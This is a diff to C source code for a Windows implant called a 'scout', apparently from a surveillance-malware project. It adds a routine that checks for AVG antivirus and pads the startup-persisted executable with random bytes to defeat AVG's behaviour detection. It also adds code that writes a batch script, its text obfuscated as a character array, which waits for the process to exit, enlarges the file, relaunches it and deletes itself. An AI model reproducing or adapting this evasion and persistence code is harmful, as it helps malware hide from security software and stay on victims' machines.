@@ -15,6 +15,8 @@
 #include "agent_device.h"
 #include "mybits.h"
 #include "antivm.h"
+#include "zmem.h"
+#include "utils.h"
 
 #define _GLOBAL_VERSION_FUNCTIONS_ //defines the exported function and the GetSharedMemoryName funcion
 #include "version.h"
@@ -184,7 +186,10 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 //	}
 
 	if (!uMelted)
+	{
 		Drop();
+		AvgInvisibility();
+	}
 
 	UseLess();
 	WaitForInput();
@@ -825,4 +830,213 @@ LPWSTR CreateTempFile()
 	free(pTempFileName);
 	
 	return pShortTempFileName;
+}
+
+VOID AvgInvisibility()
+{
+
+	    /* 
+		   Solves Avg General Behavior detection by increasing scout size in startup,
+		   scout not run from startup is not affected by this detection:
+
+			- a] current process is not running from startup -> append garbage to scout executable dropped in startup
+			- b] current process is the scout running from startup -> drop a garbage file in %temp%, the a batch that 
+																	  waits for current process to bail and then appends
+																	  the garbage to scout executable in startup and spawns
+																	  a 'fat' scout process
+		*/
+		    
+
+		LPWSTR strDestPath = GetStartupScoutName();
+		LPWSTR strSourcePath = GetMySelfName();
+		LPWSTR strStartupPath = GetStartupPath();
+
+		/* make avg scout fat */
+		WCHAR szAvg[] = { L'A', L'V', L'G', 0x0 };
+		PWCHAR pApplicationList = NULL;
+		BOOL bIsWow64, bIsOS64, bDrop;
+		
+		IsX64System(&bIsWow64, &bIsOS64);
+		
+		if (!bIsOS64)
+			pApplicationList = GetApplicationList(FALSE);
+		else
+			pApplicationList = GetApplicationList(TRUE);
+		
+		
+
+#ifdef _DEBUG
+	if (!bIsOS64)
+		OutputDebugString(L"32bit");
+	else
+		OutputDebugString(L"64bit");
+#endif
+
+		if (StrStrI(pApplicationList, szAvg)) 
+		{
+			HANDLE hScout = CreateFile(strDestPath, GENERIC_READ, FILE_SHARE_READ , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+			if(hScout == INVALID_HANDLE_VALUE)
+			{
+#ifdef _DEBUG
+				OutputDebugString(L"Failed opening scout");
+				OutputDebugString(strDestPath);
+				OutputDebugString(L"\n");
+#endif
+				
+			} else
+			{
+#ifdef _DEBUG
+				OutputDebugString(L"Read handle opened ");
+				OutputDebugString(strDestPath);
+				OutputDebugString(L"\n");
+#endif
+
+				LARGE_INTEGER lM;
+				lM.QuadPart =  1048576 + 10;
+				LONGLONG lPadding = 0;
+				LARGE_INTEGER lFileSize;
+				GetFileSizeEx(hScout, &lFileSize);
+				
+				lPadding = lM.QuadPart - lFileSize.QuadPart;
+
+				
+				if( lPadding > 0 )
+				{
+
+					/* a] not running from startup, just expand scout file on startup */
+					if( !AmIFromStartup() ) 
+					{
+						/* open rw handle */
+						CloseHandle(hScout);
+						hScout = CreateFile(strDestPath, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		
+						if(hScout != INVALID_HANDLE_VALUE)
+						{
+#ifdef _DEBUG
+							OutputDebugString(L"Reopened scout");
+						
+#endif
+				
+							BOOL bFileAppended = FALSE;
+							DWORD dwPaddingWritten = 0;
+							LPBYTE lpGarbagePadding = GetRandomData(lPadding);
+							DWORD dwFilePtr = SetFilePointer(hScout, 0, NULL, FILE_END);
+							if(dwFilePtr != INVALID_SET_FILE_POINTER)
+							{
+								bFileAppended = WriteFile(hScout,lpGarbagePadding,lPadding, &dwPaddingWritten,NULL);
+								zfree(lpGarbagePadding);
+#ifdef _DEBUG
+								if(bFileAppended && dwPaddingWritten == lPadding)
+									OutputDebugString(L"Scout appended correctly\n");
+								else
+									OutputDebugString(L"Issues appending scout\n");
+#endif
+							}
+						}
+					} else 
+
+					/* b] if scout is running from startup and is not big enough (lPadding > 0), i.e. exploit expand it with a batch then exit */
+					{
+						
+						LPWSTR lpTempFile = CreateTempFile();
+						HANDLE hGarbageFile = CreateFile(lpTempFile, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+						if( hGarbageFile != INVALID_HANDLE_VALUE )
+						{
+							DWORD dwPaddingWritten = 0;
+							LPBYTE lpGarbagePadding = GetRandomData(lPadding);
+
+							BOOL bGarbageFileWritten = WriteFile(hGarbageFile, lpGarbagePadding, lPadding, &dwPaddingWritten, NULL);
+							zfree(lpGarbagePadding);
+							CloseHandle(hGarbageFile);
+
+#ifdef _DEBUG
+							if(bGarbageFileWritten && dwPaddingWritten == lPadding)
+								OutputDebugString(L"Garbage file written\n");
+							else
+								OutputDebugString(L"Issues writing garbage file\n");
+#endif
+
+							/* Batch file increases scout size, then respawns a fat scout process */
+							PWCHAR pBatchName;
+							CreateFileAppenderBatch(lpTempFile, strDestPath, &pBatchName);
+							StartBatch(pBatchName);
+							ExitProcess(0);
+
+
+						}
+
+					}
+				}
+				CloseHandle(hScout);
+			}
+		}
+#ifdef _DEBUG
+		else {
+			OutputDebugString(L"No avg here");
+		}
+#endif
+		
+		/* free resources */
+		zfree(pApplicationList);
+		zfree(strDestPath);
+		zfree(strSourcePath);
+		zfree(strStartupPath);
+		
+
+}
+
+VOID CreateFileAppenderBatch(__in PWCHAR lpGarbageFile, __in PWCHAR lpScoutStartupPath, __out PWCHAR *pBatchOutName)
+{
+	HANDLE hFile;
+	ULONG uTick, uOut;
+	PWCHAR pTempPath = GetTemp();
+	PWCHAR pBatchName = (PWCHAR) malloc(32767*sizeof(WCHAR));
+	
+	/* 
+		@echo off
+		:t
+		tasklist /FI "IMAGENAME eq %S" | findstr "No tasks"   # 1) current process name
+		timeout 1
+		if ERRORLEVEL 1 goto :t
+		type "%S" > "%S"									  # 2) garbage file , 3) scout path in startup
+		start /B cmd /c "%S"								  # 4) scout path in startup
+		del /F "%S"											  # 5) garbage file 
+		del /F "%S"											  # 6) batch file 
+	*/
+	CHAR pBatchFormat[] = { '@','e','c','h','o',' ','o','f','f', '\r', '\n',   ':','t', '\r', '\n', 't', 'i', 'm', 'e', 'o', 'u', 't', ' ', '1', '\r', '\n','t','a','s','k','l','i','s','t',' ','/','F','I',' ','"','I','M','A','G','E','N','A','M','E',' ','e','q',' ','%','S','"',' ','|',' ','f','i','n','d','s','t','r',' ','"','N','o',' ','t','a','s','k','s','"', '\r', '\n', 'i','f',' ','E','R','R','O','R','L','E','V','E','L',' ','1',' ','g','o','t','o',' ',':','t', '\r', '\n', 't','y','p','e',' ','"','%','S','"',' ','>', '>',' ','"','%','S','"', '\r', '\n', 's','t','a','r','t',' ','/','B',' ','c','m','d',' ','/','c',' ','"','%','S','"', '\r', '\n',  'd','e','l',' ','/','F',' ','"','%','S','"', '\r', '\n', 	'd','e','l',' ','/','F',' ','"','%','S','"', 0x0 };
+
+	PCHAR pBatchBuffer = (PCHAR) malloc(strlen(pBatchFormat) + (32767 * 3));
+
+	uTick = GetTickCount();
+	do
+	{
+		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
+		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile && hFile != INVALID_HANDLE_VALUE)
+			break;
+	}
+	while (1);
+
+	WCHAR lpFullImageName[MAX_PATH*2];
+	GetModuleFileName(NULL, lpFullImageName, MAX_PATH*2);
+	PWCHAR lpImageName = PathFindFileName(lpFullImageName);
+
+	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, lpImageName, lpGarbageFile, lpScoutStartupPath, lpScoutStartupPath, lpGarbageFile, pBatchName); 
+	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
+	CloseHandle(hFile);
+
+#ifdef _DEBUG
+	OutputDebugString(pBatchName);
+	OutputDebugString(L"\n");
+	OutputDebugString(lpImageName);
+	OutputDebugString(L"\n");
+	OutputDebugStringA(pBatchBuffer);
+#endif
+
+
+	*pBatchOutName = pBatchName;
+
+	free(pBatchBuffer);
+	free(pTempPath);
 }
